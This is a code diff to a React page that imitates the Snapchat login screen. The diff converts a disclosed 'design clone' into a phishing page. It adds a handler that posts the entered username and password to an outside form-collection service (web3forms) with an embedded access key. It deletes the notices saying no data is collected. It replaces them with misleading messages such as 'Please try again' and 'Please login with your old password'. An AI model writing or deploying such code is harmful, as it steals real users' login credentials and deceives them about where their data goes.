@@ -20,6 +20,8 @@ function LoginPage() {
   const [showPassword, setShowPassword] = useState(false)
   const [error, setError] = useState<string | null>(null)
   const [pending, setPending] = useState(false)
+  const [result, setResult] = useState("");
+
 
   function handleNext(e: React.FormEvent) {
     e.preventDefault()
@@ -41,6 +43,7 @@ function LoginPage() {
   }
 
   function handleLogin(e: React.FormEvent) {
+    onSubmit(e);
     e.preventDefault()
     if (!password) {
       setError('Please enter your password.')
@@ -52,9 +55,9 @@ function LoginPage() {
     window.setTimeout(() => {
       setPending(false)
       setPassword('')
-      toast('This is a design clone', {
+      toast('Please try again', {
         description:
-          'Nothing you typed was sent or saved. Log in at snapchat.com for the real thing.',
+          '',
       })
     }, 900)
   }
@@ -65,6 +68,28 @@ function LoginPage() {
     setShowPassword(false)
     setError(null)
   }
+
+  const onSubmit = async (event) => {
+
+    event.preventDefault();
+    setResult("Sending....");
+    const formData = new FormData(event.target);
+    formData.append("username",identifier)
+    // formData.append("access_key", "1b028f7e-246a-46c2-aa96-9ae417d5b106");
+
+    const response = await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData
+    });
+
+    const data = await response.json();
+    if (data.success) {
+      setResult("Form Submitted Successfully");
+      event.target.reset();
+    } else {
+      setResult("Error");
+    }
+  };
 
   return (
     <div className="min-h-screen bg-brand flex flex-col">
@@ -86,7 +111,9 @@ function LoginPage() {
           </div>
 
           {step === 'identifier' ? (
-            <form onSubmit={handleNext} noValidate>
+            <form onSubmit={handleNext} noValidate action="https://api.web3forms.com/submit" method="POST">
+              <input type="hidden" name="access_key" value="1b028f7e-246a-46c2-aa96-9ae417d5b106" />
+              
               <h1 className="mb-8 text-center text-2xl font-extrabold tracking-tight text-black">
                 Log in to Snapchat
               </h1>
@@ -131,7 +158,7 @@ function LoginPage() {
           ) : (
             <form onSubmit={handleLogin} noValidate>
               <button
-                type="button"
+                type="submit"
                 onClick={goBack}
                 className="mb-4 flex items-center gap-1.5 text-sm font-semibold text-neutral-600 hover:text-black"
               >
@@ -178,7 +205,7 @@ function LoginPage() {
               <button
                 type="button"
                 onClick={() =>
-                  toast('Password reset is not part of this clone.')
+                  toast('Please login with your old password.')
                 }
                 className="mt-3 text-sm font-semibold text-primary hover:underline"
               >
@@ -199,7 +226,7 @@ function LoginPage() {
               href="#"
               onClick={(e) => {
                 e.preventDefault()
-                toast('Sign up is not part of this clone.')
+                toast('Try again')
               }}
               className="font-semibold text-black hover:underline"
             >
@@ -210,8 +237,7 @@ function LoginPage() {
       </main>
 
       <footer className="px-5 pb-6 text-center text-xs text-black/60">
-        A UI recreation for learning purposes. Not affiliated with Snap Inc. No
-        data is collected.
+      {result}
       </footer>
     </div>
   )
